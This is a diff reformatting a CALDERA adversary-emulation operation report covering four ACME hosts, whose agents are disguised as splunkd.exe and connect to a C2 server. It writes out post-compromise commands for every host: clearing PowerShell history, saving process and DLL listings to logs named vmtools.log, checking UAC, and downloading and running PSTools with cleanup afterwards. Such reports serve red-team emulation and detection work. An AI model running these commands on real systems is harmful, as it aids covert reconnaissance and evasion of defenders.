@@ -2,475 +2,428 @@
 Enumeration
 ===========
 
-Contents
-========
+# CALDERA Operation Report
 
-* [Hosts Attacked](#hosts-attacked)
-* [Links](#links)
-	* [Host: ACME-HH-ZYQ](#host-acme-hh-zyq)
-	* [Host: ACME-HH-EUO](#host-acme-hh-euo)
-	* [Host: ACME-WS-PLU](#host-acme-ws-plu)
-	* [Host: ACME-HH-ESO](#host-acme-hh-eso)
-* [Steps](#steps)
-	* [Host: ACME-HH-ZYQ (paw: kwmxux)](#host-acme-hh-zyq-paw-kwmxux)
-		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
-		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
-		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
-		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
-		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
-	* [Host: ACME-HH-EUO (paw: acpuoe)](#host-acme-hh-euo-paw-acpuoe)
-		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
-		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
-		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
-		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
-		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
-	* [Host: ACME-WS-PLU (paw: hkrmxr)](#host-acme-ws-plu-paw-hkrmxr)
-		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
-		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
-		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
-		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
-		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
-	* [Host: ACME-HH-ESO (paw: nowkww)](#host-acme-hh-eso-paw-nowkww)
-		* [  Description: Capture process id, executable path, pid and parent pid before writing to disk](#--description-capture-process-id-executable-path-pid-and-parent-pid-before-writing-to-disk)
-		* [  Description: Capture running processes and their loaded DLLs](#--description-capture-running-processes-and-their-loaded-dlls)
-		* [  Description: Capture running processes via PowerShell](#--description-capture-running-processes-via-powershell)
-		* [  Description: Determine whether or not UAC is enabled](#--description-determine-whether-or-not-uac-is-enabled)
-		* [  Description: Process discovery via SysInternals pstool](#--description-process-discovery-via-sysinternals-pstool)
 
+**Operation:** Enumeration<br>**Start:** 2024-09-13T17:30:01Z<br>**Adversary:** Enumerator
 # Hosts Attacked
 
-|Host|User|Beachhead Command|PID|Parent PID|IP|C2 Server|
+|Host|User|Beachhead Cmd|PID|Parent PID|IPs|C2 Server|
 | :---: | :---: | :---: | :---: | :---: | :---: | :---: |
 |ACME-HH-ZYQ|ACME\grantj|splunkd.exe|3872|4840|172.31.45.222|http://172.31.10.226:8888|
 |ACME-HH-EUO|ACME\grantj|splunkd.exe|1052|2004|172.31.41.178|http://172.31.10.226:8888|
 |ACME-WS-PLU|ACME\grantj|splunkd.exe|1116|8312|172.31.11.139, 172.25.240.1|http://172.31.10.226:8888|
 |ACME-HH-ESO|ACME\grantj|splunkd.exe|8376|8992|172.31.39.111|http://172.31.10.226:8888|
 
-# Links
+# Execution Timeline
 
-(what exactly is a link? seems to be a command executed when initializing the beachhead?)
-## Host: ACME-HH-ZYQ
 
+**[LINK] ACME-HH-ZYQ (kwmxux)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 2304
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-04T03:18:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-04T03:18:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 2304
 
+**Time:** 2024-09-04T03:18:40Z → 2024-09-04T03:18:40Z
 
-## Host: ACME-HH-EUO
 
+**[LINK] ACME-HH-EUO (acpuoe)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 4324
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:10:22Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:10:22Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 4324
 
+**Time:** 2024-09-13T17:10:22Z → 2024-09-13T17:10:22Z
 
-## Host: ACME-WS-PLU
 
+**[LINK] ACME-WS-PLU (hkrmxr)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 8504
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:12:11Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:12:12Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 8504
 
+**Time:** 2024-09-13T17:12:11Z → 2024-09-13T17:12:12Z
 
-## Host: ACME-HH-ESO
 
+**[LINK] ACME-HH-ESO (nowkww)**
 
-  Technique: Indicator Removal on Host: Clear Command History
+**Command:** `Clear-History;Clear`
 
-  PID: 10164
+**Description:** N/A
 
-  Status: Success
+**Technique:** Indicator Removal on Host: Clear Command History
 
-  Start: 2024-09-13T17:15:40Z
+**ATT&CK:** [T1070.003](https://attack.mitre.org/techniques/T1070/003)
 
-  Finish: 2024-09-13T17:15:40Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-Clear-History;Clear
-```
+**PID:** 10164
 
+**Time:** 2024-09-13T17:15:40Z → 2024-09-13T17:15:40Z
 
-# Steps
 
-## Host: ACME-HH-ZYQ (paw: kwmxux)
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-###   Description: Capture process id, executable path, pid and parent pid before writing to disk
+**Command:** `wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
+**Description:** Capture process id, executable path, pid and parent pid before writing to disk
 
-  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}
+**Technique:** WMIC
 
-  Status: Success
+**ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047)
 
-  PID: 3796
+**Status:** `Success`
 
-  Start: 2024-09-13T17:30:41Z
+**PID:** 3796
 
-  Command: 
-```powershell
-wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**Time:** 2024-09-13T17:30:41Z → N/A
 
 
-###   Description: Capture running processes and their loaded DLLs
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
+**Command:** `tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Description:** Capture running processes and their loaded DLLs
 
-  Status: Success
+**Technique:** Process Discovery
 
-  PID: 6220
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Start: 2024-09-13T17:31:23Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
-```
+**PID:** 6220
 
+**Time:** 2024-09-13T17:31:23Z → N/A
 
-###   Description: Capture running processes via PowerShell
 
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Command:** `get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
-  Status: Success
+**Description:** Capture running processes via PowerShell
 
-  PID: 7496
+**Technique:** Process Discovery
 
-  Start: 2024-09-13T17:32:05Z
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Command: 
-```powershell
-get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**Status:** `Success`
 
+**PID:** 7496
 
-###   Description: Determine whether or not UAC is enabled
+**Time:** 2024-09-13T17:32:05Z → N/A
 
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  Status: Success
+**Command:** `echo $(get-uac)`
 
-  PID: 6276
+**Description:** Determine whether or not UAC is enabled
 
-  Start: 2024-09-13T17:33:10Z
+**Technique:** Software Discovery: Security Software Discovery
 
-  Command: 
-```powershell
-echo $(get-uac)
-```
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
+**Status:** `Success`
 
-###   Description: Process discovery via SysInternals pstool
+**PID:** 6276
 
+**Time:** 2024-09-13T17:33:10Z → N/A
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
 
-  Status: Success
+**[STEP] ACME-HH-ZYQ (kwmxux)**
 
-  PID: 7556
+**Command:** `$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse`
 
-  Start: 2024-09-13T17:33:48Z
+**Description:** Process discovery via SysInternals pstool
 
-  Command: 
-```powershell
-$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
-```
+**Technique:** Process Discovery
 
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-## Host: ACME-HH-EUO (paw: acpuoe)
+**Status:** `Success`
 
-###   Description: Capture process id, executable path, pid and parent pid before writing to disk
+**PID:** 7556
 
+**Time:** 2024-09-13T17:33:48Z → N/A
 
-  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}
 
-  Status: Success
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  PID: 5192
+**Command:** `wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
-  Start: 2024-09-13T17:30:05Z
+**Description:** Capture process id, executable path, pid and parent pid before writing to disk
 
-  Command: 
-```powershell
-wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**Technique:** WMIC
 
+**ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047)
 
-###   Description: Capture running processes and their loaded DLLs
+**Status:** `Success`
 
+**PID:** 5192
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Time:** 2024-09-13T17:30:05Z → N/A
 
-  Status: Success
 
-  PID: 5976
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Start: 2024-09-13T17:31:03Z
+**Command:** `tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log`
 
-  Command: 
-```powershell
-tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
-```
+**Description:** Capture running processes and their loaded DLLs
 
+**Technique:** Process Discovery
 
-###   Description: Capture running processes via PowerShell
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
+**Status:** `Success`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**PID:** 5976
 
-  Status: Success
+**Time:** 2024-09-13T17:31:03Z → N/A
 
-  PID: 4828
 
-  Start: 2024-09-13T17:32:00Z
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-  Command: 
-```powershell
-get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**Command:** `get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
+**Description:** Capture running processes via PowerShell
 
-###   Description: Determine whether or not UAC is enabled
+**Technique:** Process Discovery
 
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**Status:** `Success`
 
-  Status: Success
+**PID:** 4828
 
-  PID: 3640
+**Time:** 2024-09-13T17:32:00Z → N/A
 
-  Start: 2024-09-13T17:32:50Z
 
-  Command: 
-```powershell
-echo $(get-uac)
-```
+**[STEP] ACME-HH-EUO (acpuoe)**
 
+**Command:** `echo $(get-uac)`
 
-###   Description: Process discovery via SysInternals pstool
+**Description:** Determine whether or not UAC is enabled
 
+**Technique:** Software Discovery: Security Software Discovery
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
-  Status: Success
+**Status:** `Success`
 
-  PID: 5460
+**PID:** 3640
 
-  Start: 2024-09-13T17:33:48Z
+**Time:** 2024-09-13T17:32:50Z → N/A
 
-  Command: 
-```powershell
-$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
-```
 
+**[STEP] ACME-HH-EUO (acpuoe)**
 
-## Host: ACME-WS-PLU (paw: hkrmxr)
+**Command:** `$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse`
 
-###   Description: Capture process id, executable path, pid and parent pid before writing to disk
+**Description:** Process discovery via SysInternals pstool
 
+**Technique:** Process Discovery
 
-  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Status: Success
+**Status:** `Success`
 
-  PID: 7176
+**PID:** 5460
 
-  Start: 2024-09-13T17:30:48Z
+**Time:** 2024-09-13T17:33:48Z → N/A
 
-  Command: 
-```powershell
-wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-###   Description: Capture running processes and their loaded DLLs
+**Command:** `wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
+**Description:** Capture process id, executable path, pid and parent pid before writing to disk
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Technique:** WMIC
 
-  Status: Success
+**ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047)
 
-  PID: 5824
+**Status:** `Success`
 
-  Start: 2024-09-13T17:31:42Z
+**PID:** 7176
 
-  Command: 
-```powershell
-tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
-```
+**Time:** 2024-09-13T17:30:48Z → N/A
 
 
-###   Description: Capture running processes via PowerShell
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
+**Command:** `tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Description:** Capture running processes and their loaded DLLs
 
-  Status: Success
+**Technique:** Process Discovery
 
-  PID: 6840
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Start: 2024-09-13T17:32:25Z
+**Status:** `Success`
 
-  Command: 
-```powershell
-get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**PID:** 5824
 
+**Time:** 2024-09-13T17:31:42Z → N/A
 
-###   Description: Determine whether or not UAC is enabled
 
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**Command:** `get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
-  Status: Success
+**Description:** Capture running processes via PowerShell
 
-  PID: 8560
+**Technique:** Process Discovery
 
-  Start: 2024-09-13T17:33:15Z
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Command: 
-```powershell
-echo $(get-uac)
-```
+**Status:** `Success`
 
+**PID:** 6840
 
-###   Description: Process discovery via SysInternals pstool
+**Time:** 2024-09-13T17:32:25Z → N/A
 
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Status: Success
+**Command:** `echo $(get-uac)`
 
-  PID: 4952
+**Description:** Determine whether or not UAC is enabled
 
-  Start: 2024-09-13T17:34:04Z
+**Technique:** Software Discovery: Security Software Discovery
 
-  Command: 
-```powershell
-$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
-```
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
 
+**Status:** `Success`
 
-## Host: ACME-HH-ESO (paw: nowkww)
+**PID:** 8560
 
-###   Description: Capture process id, executable path, pid and parent pid before writing to disk
+**Time:** 2024-09-13T17:33:15Z → N/A
 
 
-  Attack: {'tactic': 'collection', 'technique_name': 'WMIC', 'technique_id': 'T1047'}
+**[STEP] ACME-WS-PLU (hkrmxr)**
 
-  Status: Success
+**Command:** `$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse`
 
-  PID: 9872
+**Description:** Process discovery via SysInternals pstool
 
-  Start: 2024-09-13T17:30:48Z
+**Technique:** Process Discovery
 
-  Command: 
-```powershell
-wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
+**Status:** `Success`
 
-###   Description: Capture running processes and their loaded DLLs
+**PID:** 4952
 
+**Time:** 2024-09-13T17:34:04Z → N/A
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
 
-  Status: Success
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  PID: 3004
+**Command:** `wmic process get executablepath,name,processid,parentprocessid >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
-  Start: 2024-09-13T17:31:34Z
+**Description:** Capture process id, executable path, pid and parent pid before writing to disk
 
-  Command: 
-```powershell
-tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log
-```
+**Technique:** WMIC
 
+**ATT&CK:** [T1047](https://attack.mitre.org/techniques/T1047)
 
-###   Description: Capture running processes via PowerShell
+**Status:** `Success`
 
+**PID:** 9872
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Time:** 2024-09-13T17:30:48Z → N/A
 
-  Status: Success
 
-  PID: 6392
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Start: 2024-09-13T17:32:24Z
+**Command:** `tasklist /m  >> $env:APPDATA\vmtool.log;cat $env:APPDATA\vmtool.log`
 
-  Command: 
-```powershell
-get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log
-```
+**Description:** Capture running processes and their loaded DLLs
 
+**Technique:** Process Discovery
 
-###   Description: Determine whether or not UAC is enabled
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
+**Status:** `Success`
 
-  Attack: {'tactic': 'discovery', 'technique_name': 'Software Discovery: Security Software Discovery', 'technique_id': 'T1518.001'}
+**PID:** 3004
 
-  Status: Success
+**Time:** 2024-09-13T17:31:34Z → N/A
 
-  PID: 6448
 
-  Start: 2024-09-13T17:33:22Z
+**[STEP] ACME-HH-ESO (nowkww)**
 
-  Command: 
-```powershell
-echo $(get-uac)
-```
+**Command:** `get-process >> $env:APPDATA\vmtools.log;cat $env:APPDATA\vmtools.log`
 
+**Description:** Capture running processes via PowerShell
 
-###   Description: Process discovery via SysInternals pstool
+**Technique:** Process Discovery
 
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
 
-  Attack: {'tactic': 'collection', 'technique_name': 'Process Discovery', 'technique_id': 'T1057'}
+**Status:** `Success`
 
-  Status: Success
+**PID:** 6392
 
-  PID: 3484
+**Time:** 2024-09-13T17:32:24Z → N/A
 
-  Start: 2024-09-13T17:34:32Z
 
-  Command: 
-```powershell
-$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse
-```
+**[STEP] ACME-HH-ESO (nowkww)**
 
+**Command:** `echo $(get-uac)`
+
+**Description:** Determine whether or not UAC is enabled
+
+**Technique:** Software Discovery: Security Software Discovery
+
+**ATT&CK:** [T1518.001](https://attack.mitre.org/techniques/T1518/001)
+
+**Status:** `Success`
+
+**PID:** 6448
+
+**Time:** 2024-09-13T17:33:22Z → N/A
+
+
+**[STEP] ACME-HH-ESO (nowkww)**
+
+**Command:** `$ps_url = "https://download.sysinternals.com/files/PSTools.zip";$download_folder = "C:\Users\Public\";$staging_folder = "C:\Users\Public\temp";Start-BitsTransfer -Source $ps_url -Destination $download_folder;Expand-Archive -LiteralPath $download_folder"PSTools.zip" -DestinationPath $staging_folder;iex $staging_folder"\pslist.exe" >> $env:LOCALAPPDATA\output.log;Remove-Item $download_folder"PSTools.zip";Remove-Item $staging_folder -Recurse`
+
+**Description:** Process discovery via SysInternals pstool
+
+**Technique:** Process Discovery
+
+**ATT&CK:** [T1057](https://attack.mitre.org/techniques/T1057)
+
+**Status:** `Success`
+
+**PID:** 3484
+
+**Time:** 2024-09-13T17:34:32Z → N/A
+
+
+![Operation Graph](enumeration_graph.png)
